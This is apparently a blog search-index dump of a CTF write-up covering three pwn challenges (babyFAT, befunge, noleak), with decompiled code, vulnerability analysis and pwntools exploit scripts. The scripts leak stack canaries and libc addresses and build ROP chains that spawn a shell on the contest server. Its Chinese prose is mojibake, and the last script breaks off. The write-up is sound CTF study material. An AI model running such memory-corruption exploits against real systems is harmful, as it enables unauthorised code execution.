äº”ä¸€æ¬¢ä¹èµ›å‡æœŸæ²¡äººçº¦ï¼Œæ²¡äº‹å¹²åˆä¸æƒ³å†™ä½œä¸šåªèƒ½aé¢˜äº†ï¼Œå»å¹´åä¸€çš„æ—¶å€™ç¬¬ä¸€æ¬¡åšLilacçš„é¢˜ï¼Œ5å¤©åšå‡ºä¸€é“ï¼ˆå¤ªèœäº†ã€‚è¿™æ¬¡æŠŠé¢˜AKäº†ï¼Œå¾ˆå¼€å¿ƒ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#lilac-2021-äº”ä¸€æ¬¢ä¹èµ›"},{"categories":["Writeups"],"content":"babyFAT","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#babyfat"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-4"},{"categories":["Writeups"],"content":"IDA int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp+7h] [rbp-109h] BYREF int v5; // [rsp+8h] [rbp-108h] int v6; // [rsp+Ch] [rbp-104h] int v7; // [rsp+10h] [rbp-100h] int v8; // [rsp+14h] [rbp-FCh] int i; // [rsp+18h] [rbp-F8h] int v10; // [rsp+1Ch] [rbp-F4h] char nptr[16]; // [rsp+20h] [rbp-F0h] BYREF char FAT[112]; // [rsp+30h] [rbp-E0h] BYREF char string[104]; // [rsp+A0h] [rbp-70h] BYREF unsigned __int64 v14; // [rsp+108h] [rbp-8h] v14 = __readfsqword(0x28u); v6 = 0; v7 = v5; v10 = 0; setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); hello(); do { print_menu(); __isoc99_scanf(\" %c\", \u0026v4); if ( v4 == 50 ) { for ( i = v5; ; i = FAT[i] ) { putchar(string[i]); if ( i == v7 ) break; } puts(\u0026byte_400DD8); } else if ( v4 \u003e 50 ) { if ( v4 == 51 ) { printf(\"Index: \"); __isoc99_scanf(\"%s\", nptr); v10 = atoi(nptr); if ( v6 ) { for ( i = v5; ; i = FAT[i] ) { if ( i == v10 ) { printf(\"Input content: \"); __isoc99_scanf(\" %c\", \u0026string[v10]); puts(\"Success\"); goto LABEL_27; } if ( i == v7 ) break; } puts(\"Wrong idx!\"); } } else if ( v4 == 52 ) { v6 = 0; memset(FAT, 0, 0x64uLL); memset(string, 0, 0x64uLL); puts(\"Success\"); } } else if ( v4 == 49 ) { if ( v6 \u003c= 99 ) { printf(\"Index: \"); __isoc99_scanf(\"%s\", nptr); v10 = (int)abs32(atoi(nptr)) % 100; printf(\"Input content: \"); if ( v6 ) FAT[v8] = v10; else v5 = v10; v8 = v10; ++v6; v7 = v10; __isoc99_scanf(\" %c\", \u0026string[v10]); } else { puts(\"full!\"); } } LABEL_27: ; } while ( v4 != 53 ); puts(\"Bye~\"); return 0; } å¼€å¯äº†canaryä¿æŠ¤ï¼Œè¿˜æœ‰ä¸€ä¸ªåé—¨ã€‚åœ¨writeå’Œeditçš„æ—¶å€™ä½¿ç”¨çš„__isoc99_scanf(\"%s\", nptr);ä¼šé€ æˆä»»æ„é•¿åº¦æº¢å‡ºï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“canaryçš„å€¼ã€‚ç¨‹åºæœ¬èº«æ˜¯ä¸€ä¸ªFile Allocation Tableï¼Œé€šè¿‡FAT[]æ•°ç»„å¯»æ‰¾ä¸‹ä¸€ä¸ªå­—ç¬¦çš„ä¸‹æ ‡ï¼Œä¾‹å¦‚FAT[1] = 12é‚£ä¹ˆ1ä¹‹åå°±è¦å»æ‰¾12ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆæ£’çš„è§†é¢‘ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡ºè¦†ç›–FAT[0]çš„å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°ï¼Œé€ æˆæ•°ç»„è¶…ç•Œã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥leak canaryã€‚ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-4"},{"categories":["Writeups"],"content":"exp from pwn import * context.log_level=\"DEBUG\" p = remote(\"101.200.201.114\",30001) def write(idx,content): p.sendlineafter('choice: ','1') p.sendlineafter('Index: ',str(idx)) p.sendline(str(content)) def show(): p.sendlineafter('choice: ','2') def edit(idx,content): p.sendlineafter('choice: ','3') p.sendlineafter('Index: ',str(idx)) p.sendline(str(content)) ## xx xx xx xx xx xx xx 00 ## +6 +5 +4 +3 +2 +1 +0 write(0,'a') write(1,'a') payload = p32(0)*4+p8(0x69)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_1 = u8(p.recv(1)) print(hex(bit_1)) payload = p32(0)*4+p8(0x69+1)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_2 = u8(p.recv(1)) print(hex(bit_2)) payload = p32(0)*4+p8(0x69+2)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_3 = u8(p.recv(1)) print(hex(bit_3)) payload = p32(0)*4+p8(0x69+3)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_4 = u8(p.recv(1)) print(hex(bit_4)) payload = p32(0)*4+p8(0x69+4)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_5 = u8(p.recv(1)) print(hex(bit_5)) payload = p32(0)*4+p8(0x69+5)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_6 = u8(p.recv(1)) print(hex(bit_6)) payload = p32(0)*4+p8(0x69+6)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_7 = u8(p.recv(1)) print(hex(bit_7)) canary = +p8(0)+p8(bit_1)+p8(bit_2)+p8(bit_3)+p8(bit_4)+p8(bit_5)+p8(bit_6)+p8(bit_7) payload = \"\\x00\"*(0xf0-8)+canary+p64(0)+p64(0x04008E7) write(payload,'a') #gdb.attach(p) p.sendlineafter('choice: ','5') p.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-4"},{"categories":["Writeups"],"content":"befunge","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#befunge"},{"categories":["Writeups"],"content":"checksc Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksc"},{"categories":["Writeups"],"content":"IDA __int64 __fastcall main(int a1, char **a2, char **a3) { char *v3; // rbp unsigned __int64 v4; // rcx __int64 i; // rax char v6; // di char v7; // dl __int64 v8; // rdi int v9; // eax __int64 v10; // r14 __int64 v11; // rdi __int64 v12; // r14 __int64 v13; // rdi __int64 v14; // r14 __int64 v15; // rdi __int64 v16; // r14 __int64 v17; // rdi __int64 v18; // r14 __int64 v19; // rdi __int64 v20; // r14 __int64 v21; // rax __int64 v22; // rax __int64 v23; // r14 __int64 v24; // r15 __int64 v25; // r14 __int64 v26; // r14 __int64 v27; // rax __int64 v28; // r15 __int64 v29; // r14 int v30; // eax int step; // ebx int v33; // [rsp+Ch] [rbp-9Ch] BYREF char s[80]; // [rsp+10h] [rbp-98h] BYREF __int16 v35; // [rsp+60h] [rbp-48h] unsigned __int64 v36; // [rsp+68h] [rbp-40h] v36 = __readfsqword(0x28u); alarm(0x28u); __sysv_signal(14, handler); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); puts(\"Welcome to Online Befunge(93) Interpreter\"); puts(\"Please input your program.\"); v3 = program; do { __printf_chk(1LL, \"\u003e \"); memset(s, 0, sizeof(s)); v35 = 0; if ( !fgets(s, 82, stdin) ) break; if ( s[0] ) { v4 = strlen(s) + 1; if ( *((_BYTE *)\u0026v33 + v4 + 2) == 10 ) *((_BYTE *)\u0026v33 + v4 + 2) = 0; } for ( i = 0LL; i != 80; ++i ) v3[i] = s[i]; v3 += 80; } while ( v3 != \u0026program[2000] ); step = 10001; do { if ( string_mode ) { v6 = program[80 * y_offset + x_offset]; if ( v6 == 34 ) string_mode = 0; else push(v6); } else if ( bridge \u003c= 0 ) { v7 = program[80 * y_offset + x_offset]; switch ( v7 ) { case ' ': break; case '!': v22 = pop(); push(v22 == 0); break; case '\"': string_mode = 1; break; case '#': bridge = 1; break; case '$': pop(); break; case '%': v18 = pop(); v19 = pop() % v18; push(v19); break; case '\u0026': __isoc99_scanf(\"%d\", \u0026v33); push(v33); break; case '*': v14 = pop(); v15 = v14 * pop(); push(v15); break; case '+': v10 = pop(); v11 = pop() + v10; push(v11); break; case ',': v9 = pop(); _IO_putc(v9, stdout); break; case '-': v12 = pop(); v13 = pop() - v12; push(v13); break; case '.': pop(); __printf_chk(1LL, \u0026off_12F0); break; case '/': v16 = pop(); v17 = pop() / v16; push(v17); break; case ':': v23 = pop(); push(v23); push(v23); break; case '\u003c': move = 2; break; case '\u003e': move = 0; break; case '@': puts(\"\\n\"); puts(\"Program exited\"); exit(0); case '\\\\': v24 = pop(); v25 = pop(); push(v24); push(v25); break; case '^': move = 3; break; case '_': move = pop() != 0 ? 2 : 0; break; case '`': v20 = pop(); v21 = pop(); push(v21 \u003e v20); break; case 'g': v26 = pop(); v27 = pop(); push(program[80 * v26 + v27]); break; case 'p': v28 = pop(); v29 = pop(); program[80 * v28 + v29] = pop(); break; case 'v': move = 1; break; case '|': move = pop() == 0 ? 1 : 3; break; case '~': v8 = _IO_getc(stdin); push(v8); break; default: if ( (unsigned __int8)(v7 - 48) \u003c= 9u ) push(v7 - 48); break; } } else { --bridge; } y_offset += dword_14E0[move]; v30 = x_offset + dword_14F0[move]; x_offset = v30; if ( y_offset == -1 ) { y_offset = 24; } else if ( y_offset == 25 ) { y_offset = 0; } if ( v30 == -1 ) { x_offset = 79; } else if ( x_offset == 80 ) { x_offset = 0; } --step; } while ( step ); puts(\"Too many steps. Is there any infinite loops?\"); return 0LL; } ç¨‹åºæ˜¯ä¸€ä¸ªbefunge-93çš„è§£é‡Šå™¨ï¼Œbefungeçš„ç¨‹åºå¸ƒå±€æ˜¯ä¸€ä¸ªäºŒç»´çš„å¹³é¢ï¼Œå¦‚ä¸‹ï¼š Befunge-93 ========== 0 x 79 0+-------------+ | | y| | | 24+ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-5"},{"categories":["Writeups"],"content":"Befunge-93 instruction list 0-9 Push this number on the stack + Addition: Pop a and b, then push a+b - Subtraction: Pop a and b, then push b-a * Multiplication: Pop a and b, then push a*b / Integer division: Pop a and b, then push b/a, rounded towards 0. % Modulo: Pop a and b, then push the remainder of the integer division of b/a. ! Logical NOT: Pop a value. If the value is zero, push 1; otherwise, push zero. ``` Greater than: Pop a and b, then push 1 if b\u003ea, otherwise zero. \u003e Start moving right \u003c Start moving left ^ Start moving up v Start moving down ? Start moving in a random cardinal direction _ Pop a value; move right if value=0, left otherwise ` ` \" Start string mode: push each characterâ€™s ASCII value all the way up to the next \" : Duplicate value on top of the stack \\ Swap two values on top of the stack $ Pop value from the stack and discard it . Pop value and output as an integer followed by a space , Pop value and output as ASCII character # Bridge: Skip next cell p A â€œputâ€ call (a way to store a value for later use). Pop y, x, and v, then change the character at (x,y) in the program to the character with ASCII value v g A â€œgetâ€ call (a way to retrieve data in storage). Pop y and x, then push ASCII value of the character at that position in the program \u0026 Ask user for a number and push it ~ Ask user for a character and push its ASCII value @ End program (space) No-op. Does nothing åˆ©ç”¨\u0026ï¼Œgå’Œ,çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬æœ‰åŠæ³•åšåˆ°ä»»æ„è¯»ã€‚ å…ˆé€šè¿‡\u0026å°†xè·Ÿypushåˆ°Stackä¸Šï¼Œxä¸yæˆ‘ä»¬å¯æ§ï¼ˆ32ä½æ•´æ•°ï¼‰ è¿™è¾¹æ³¨æ„stackæ˜¯ç¨‹åºåœ¨bssæ®µè‡ªè¡Œæ¨¡æ‹Ÿå‡ºæ¥çš„ä¸€å—ï¼Œæ‹¥æœ‰ç±»ä¼¼çš„å †æ ˆè¡Œä¸ºï¼Œå¹¶ä¸æ˜¯æŒ‡ç¨‹å¼çœŸæ­£çš„å †æ ˆã€‚ gçš„åŠŸèƒ½æ˜¯å°†program[80 * x + y]çš„å†…å®¹pushåˆ°Stackä¸Šã€‚å› ä¸ºxä¸yæˆ‘ä»¬å¯æ§ï¼Œä»£è¡¨ç€æˆ‘ä»¬å¯ä»¥å°†ä»»æ„ä½å€çš„å†…å®¹pushåˆ°Stackä¸Šã€‚ , å¼¹å‡ºstacké¡¶ç«¯çš„å€¼ï¼ˆå¯æ§ï¼‰popå‡ºæ¥ï¼ˆ1 byteï¼‰ï¼Œå¹¶å°å‡ºä»–çš„æ•°å€¼ã€‚ åˆ©ç”¨\u0026å’Œpçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿˜æœ‰åŠæ³•åšåˆ°ä»»æ„å†™ å…ˆç©¿é€\u0026å°†xï¼Œyä¸zpushåˆ°stackä¸Š påŠŸèƒ½ä¼šå…ˆä»å †æ ˆå¼¹å‡ºå‡º3ä¸ªå€¼ï¼ˆxï¼Œyï¼Œzï¼Œå‡å¯æ§ï¼‰ï¼Œä¹‹åå°†Å¾çš„å€¼æ”¾å…¥program[80 * x + y]ï¼ˆå³program[80 * x + y] = zï¼‰ã€‚ è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„ å› ä¸ºé€šè¿‡\u0026åŠŸèƒ½å°†æ•°å€¼pushè¿›æ ˆæ—¶ï¼Œä¸€æ¬¡åªèƒ½pushä¸€ä¸ªæ•´æ•°ï¼ˆ32ä½ï¼‰ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿program[80 * x + y]è·³åˆ°å¾ˆè¿œçš„åœ°æ–¹ï¼Œxä¸yå¾ˆæœ‰å¯èƒ½ä¼šéœ€è¦æ˜¯ä¸€ä¸ªè¶…è¿‡integerèŒƒå›´çš„æ•°å€¼ï¼Œå¦‚æ­¤ä¸€æ¥ä½¿ç”¨\u0026åŠŸèƒ½å°†æ— æ³•æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ è§£å†³æ–¹æ³•ï¼Œåˆ©ç”¨çš„*åŠŸèƒ½ã€‚*ä¼šä»å †æ ˆå¼¹å‡ºé¡¶ç«¯ä¸¤ä¸ªå‡ºæ•°å€¼xä¸yï¼Œå¹¶å°†x * yçš„æŸ¥è¯¢æŸ¥è¯¢ç»“æœæ¨å›æ ˆä¸Šã€‚è¿™é‡Œå…¨ç¨‹æ˜¯ä½¿ç”¨64ä½å¯„å­˜å™¨è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥ä¸ä¼šæœ‰æ•´æ•°32ä½çš„é—®é¢˜ã€‚ å› æ­¤ï¼Œå…ˆé€šè¿‡*åŠŸèƒ½å°†stacké¡¶ç«¯å˜æˆä¸€ä¸ªé•¿æ•´æ•°ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•å¯¹ä»»æ„ä½å€åšä»»æ„è¯»å†™ã€‚ gotè¡¨ä¸å¯å†™ï¼Œæˆ‘ä»¬åªèƒ½è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥æ‰§è¡Œshellã€‚å¦å¤–ï¼Œæˆ‘ä»¬è¿˜è¦æ³„éœ²libcçš„å€¼ã€‚ é€šè¿‡ä»»æ„åœ°å€è¯»ï¼Œæˆ‘ä»¬å°†gotè¡¨ä¸­æŸå‡½æ•°çš„åœ°å€leakä»è€Œå¾—åˆ°libcçš„åŸºå€ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡leakæ ˆåœ°å€æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œå‚è€ƒåšå®¢ï¼Œleakæ ˆåœ°å€æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•(ç¹ä½“å°±ä¸ç¿»è¯‘äº†ï¼Œçœ‹å¤šäº†å°±ä¹ æƒ¯äº†)ï¼š leak stack ä¸Šçš„ saved rbp æˆ–æ˜¯ argvã€‚è¿™éƒ¨åˆ†é€šå¸¸æ˜¯ç”¨åœ¨ format string çš„æ¼æ´ï¼Œé€™é¡Œç„¡æ³•é€™æ¨£åšã€‚ leak tls section ä¸Šçš„ stack addressã€‚é€™éƒ¨ä»½æ¯”è¼ƒé€²éšï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ç¨‹å¼åœ¨åŸ·è¡Œçš„æ™‚å€™ï¼Œæœƒæœ‰å€‹ memory çš„å€å¡Šå«åš tls sectionï¼Œè£¡é¢æœƒå­˜è¨±å¤šæœ‰ç”¨çš„æ±è¥¿ï¼Œåƒæ˜¯ stack canary, main_arena çš„ address, ä»¥åŠä¸€å€‹ä¸çŸ¥é“æŒ‡å‘å“ªè£¡çš„ stack addressã€‚è€Œè¦é€éé€™ç¨®æ–¹å¼ leak stack addressï¼Œæˆ‘å€‘å¿…é ˆè¦æœ‰è¾¦æ³•çŸ¥é“ tls section çš„ä½å€ï¼Œè€Œé€™é€šå¸¸éœ€è¦é€éç¨‹å¼å…ˆå‘¼å« mmapï¼Œä¹‹å¾Œ leak mmap å‡ºä¾†çš„ memory address ä¾†é”æˆã€‚é€™é¡Œå› ç‚ºæ²’æœ‰ malloc æˆ–æ˜¯ mmapï¼Œæ‰€ä»¥ä¹Ÿç„¡æ³•é€éé€™æ¨£çš„æ–¹å¼ä¾† leak stack addressã€‚ leak ld-linux.so çš„ __libc_stack_end symbolã€‚å¦‚æœæˆ‘å€‘æœ‰è¾¦æ³•çŸ¥é“ ld-linux.so çš„ä½å€ä»¥åŠç‰ˆæœ¬ï¼Œæˆ‘å€‘å¯ä»¥é€é leak è£¡é¢çš„ __libc_stack_end é€™å€‹ symbolï¼Œä¾†ç²å– stack addressã€‚é€™é¡Œç”¨é€™ç¨®æ–¹å¼ç†è«–ä¸Šè¾¦çš„åˆ°ï¼Œæˆ‘è‡ªå·±å°±æ˜¯ç”¨é€™ç¨®æ–¹å¼ leak çš„ï¼Œåªæ˜¯åšèµ·ä¾†éå¸¸éº»ç…©ã€‚è§£å®Œé€™é¡Œä¹‹å¾Œï¼Œç¶“è©¢å•åˆ¥äººæ‰ç™¼ç¾åŸä¾†é‚„æœ‰ç¬¬å››ç¨®æ–¹å¼ã€‚ leak libc é‡Œé¢çš„ environ symbolã€‚ libc è£¡é¢æœ‰å€‹ symbol å«åš environï¼Œè£¡é¢æœƒå­˜ stack addressã€‚å› æ­¤é€™é¡Œæ¯”è¼ƒæ¼‚äº®çš„æ–¹å¼ï¼Œæ˜¯ leak libc çš„ address ä¹‹å¾Œï¼Œç›´æ¥ leak libc.symbols['environ'] ä¾†ç²å– stack addressã€‚ æˆ‘é‡‡ç”¨äº†æœ€åä¸€ç§æ–¹å¼ï¼Œåšå®¢åŸæ–‡é‡‡ç”¨äº†ç¬¬ä¸‰ç§ç»•äº†ä¸€å¤§åœˆã€‚å¦å¤–ï¼Œè¿™é¢˜ä¼¼ä¹æ˜¯MMA CTF 2nd 2016çš„Interpreter 200å¹¶éåŸåˆ›é¢˜ã€‚ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:1","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#befunge-93-instruction-listhttpsenwikipediaorgwikibefunge"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] binary='./befunge' #gdb.attach(sh) if 'g' in sys.argv[1]: context.log_level=\"DEBUG\" if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: sh=process(binary) if 'r' in sys.argv[1]: sh=remote('101.200.201.114', 30002) elf = ELF(binary,checksec=False) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False) def cal_offset(addr, text_base): start_from = text_base + 0x202040 offset = addr - start_from off_80 = offset/80 off_1 = offset%80 return off_1, off_80 def write(addr, text_base, value): cnt = 0 off_1, off_80 = cal_offset(addr, text_base) temp = int(math.sqrt(off_80)) off_1 = (off_80 - temp**2)*80 + off_1 for i in range(off_1, off_1+6): v = (value\u003e\u003e(8*cnt)) \u0026 0xff sh.sendline(str(v)) sh.sendline(str(i)) sh.sendline(str(temp)) sh.sendline(str(temp)) cnt += 1 base = 0x202040 program = '\u003e'.ljust(79,' ')+'v'+'\\n' program+= 'v,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026'.ljust(79,' ')+'\u003c'+'\\n' #leak libc 6bytes (1st: -2, 2nd: -48 ~ -43) #leak text 6bytes-56, -9 program+= '\u003e\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,'.ljust(79,' ')+'v'+'\\n' #leak text 6bytes-56, -9 program+= 'vp*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026'.ljust(79,' ')+'\u003c'+'\\n' program+= '\u003e\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p'.ljust(79,' ')+'v'+'\\n' program+= 'vp*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026'.ljust(79,' ')+'\u003c'+'\\n' program+= ('v'.ljust(79,' ')+'\u003c'+'\\n')*17 program+= '\u003e'.ljust(79,'\u003e')+'v'+'\\n' program+= '^'.ljust(79,'\u003c')+'\u003c'+'\\n' sh.sendlineafter('\u003e',program) sh.recvuntil(\"\u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \") libc_leak = '' for i in range(6): sh.sendline(str((-48)+i)) sh.sendline(str(-2)) rev = u8(sh.recv(1)) libc_leak = libc_leak+p8(rev) leak(str(i),rev) libc_leak = u64(libc_leak.ljust(8,'\\x00')) libcbase = libc_leak-libc.sym['__libc_start_main'] system = libcbase + libc.sym[\"system\"] env = libcbase + libc.sym['environ'] binsh = libcbase+ libc.search('/bin/sh').next() leak('libc base',libcbase) leak('binsh',binsh) text_leak = '' for i in range(6): sh.sendline(str((-56)+i)) sh.sendline(str(-9)) rev = u8(sh.recv(1)) text_leak = text_leak+p8(rev) leak(str(i),rev) textbase = u64(text_leak.ljust(8,'\\x00'))-0xb00 pop_rdi = textbase + 0x120c start = base+textbase leak('text base',textbase) leak('pop rdi',pop_rdi) off_1, off_80 = cal_offset(env, textbase) temp = int(math.sqrt(off_80)) off_1 = (off_80 - temp**2)*80 + off_1 stack_leak = '' for i in range(off_1,off_1+6): sh.sendline(str(i)) sh.sendline(str(temp)) sh.sendline(str(temp)) rev = u8(sh.recv(1)) stack_leak = stack_leak+p8(rev) leak(str(i-off_1),rev) stack_leak = u64(stack_leak.ljust(8,'\\x00'))-0xf0 leak('stack_leak',stack_leak) write(stack_leak, textbase, pop_rdi) write(stack_leak+8, textbase, binsh) write(stack_leak+16, textbase, system) sh.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-5"},{"categories":["Writeups"],"content":"noleak","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#noleak"},{"categories":["Writeups"],"content":"check Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#check"},{"categories":["Writeups"],"content":"IDAadd __int64 add() { __int64 result; // rax int v1; // [rsp+0h] [rbp-10h] int nbytes; // [rsp+4h] [rbp-Ch] void *nbytes_4; // [rsp+8h] [rbp-8h] puts(\"Input index:\"); v1 = sub_9E0(); puts(\"Input size:\"); nbytes = sub_9E0(); if ( v1 \u003c 0 || v1 \u003e 10 || nbytes \u003c 0 || nbytes \u003e 496 ) { puts(\"index or size invalid!\"); result = 0xFFFFFFFFLL; } else { nbytes_4 = malloc(nbytes); puts(\"Input data:\"); read(0, nbytes_4, (unsigned int)nbytes); *((_QWORD *)\u0026unk_2020C0 + 2 * v1) = nbytes_4; dword_2020C8[4 * v1] = nbytes; result = 0LL; } return result; } dele __int64 dele() { __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts(\"Input index:\"); v1 = sub_9E0(); if ( v1 \u003e= 0 \u0026\u0026 v1 \u003c= 10 \u0026\u0026 *((_QWORD *)\u0026unk_2020C0 + 2 * v1) ) { free(*((void **)\u0026unk_2020C0 + 2 * v1)); *((_QWORD *)\u0026unk_2020C0 + 2 * v1) = 0LL; dword_2020C8[4 * v1] = 0; result = 0LL; } else { puts(\"Index invalid!\"); result = 0xFFFFFFFFLL; } return result; } edit __int64 edit() { __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts(\"Input index:\"); v1 = sub_9E0(); if ( v1 \u003e= 0 \u0026\u0026 v1 \u003c= 10 \u0026\u0026 *((_QWORD *)\u0026unk_2020C0 + 2 * v1) ) { puts(\"Input data:\"); sub_A34(*((_QWORD *)\u0026unk_2020C0 + 2 * v1), (unsigned int)dword_2020C8[4 * v1]); result = 0LL; } else { puts(\"Index invalid!\"); result = 0xFFFFFFFFLL; } return result; } è¿œç¨‹ç¯å¢ƒä¸º16.04æ¼æ´ç‚¹åœ¨editæœ‰off-by-oneï¼Œä½†æ˜¯è¦å›è½¦è·³å‡ºå¾ªç¯æˆ–è€…å°†size+1çš„ç©ºé—´å…¨éƒ¨å¡«æ»¡ã€‚ æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½¿ç”¨house of romanæ¥ç”³è¯·ioleak libcã€‚ç„¶åä½¿ç”¨fastbin attackè¦†å†™__malloc_hookã€‚ éš¾ç‚¹åœ¨å †çš„å¸ƒå±€ï¼Œ é¦–å…ˆï¼Œç”³è¯·äº”ä¸ªchunkï¼Œchunk_3æ˜¯fastbin victimå¤§å°ä¸º0x70ï¼Œåœ¨è¿™ä¸ªchunkå°¾éƒ¨ä¼ªé€ ä¸€ä¸ª0x20å¤§å°çš„chunkï¼Œç”¨ä»¥åé¢è¿›è¡Œåˆ†å‰²ï¼Œå¹¶å°†å…¶é‡Šæ”¾æ‰ã€‚ å†é€šè¿‡off-by-onechunk_0ä¼ªé€ ä¸€ä¸ªunsorted chunk = chunk_1 + chunk_2 + chunk_3ï¼Œè¿™ä¸ªchunkè¦åŒ…å«fastbin victimã€‚ editchunk_1å°†chunk_2çš„å¤§å°è®¾ä¸º0x61ï¼Œfree(unsorted chunk)ï¼Œè¿™æ—¶å†malloc(0x130)ï¼Œunsorted chunkå°±ä¼šè¢«åˆ†å‰²ï¼Œunsorted binä¸­åªç•™ä¸‹äº†chunk_3ï¼Œè€Œchunk_3åœ¨å¼€å§‹è¢«åŠ å…¥äº†fastbinä¸­ã€‚ free(chunk_2)ï¼Œchunk_2è¢«æˆ‘ä»¬ä¿®æ”¹äº†å¤§å°ï¼Œå…¶å°¾éƒ¨åŒ…å«äº†chunk_3çš„å¤´éƒ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¦†å†™å…¶fdçš„ä½å­—èŠ‚ä½¿å…¶æŒ‡å‘io_fileå°±å¯ä»¥leak libcã€‚ ä¹‹åå°±ç®€å•çš„fastbin attackäº†ã€‚ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-6"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] context.log_level=\"DEBUG\" binary='./pwn' #gdb.attach(sh) elf = ELF(binary,checksec=False) def add(idx, size, content): sh.sendlineafter('choice:', '1') 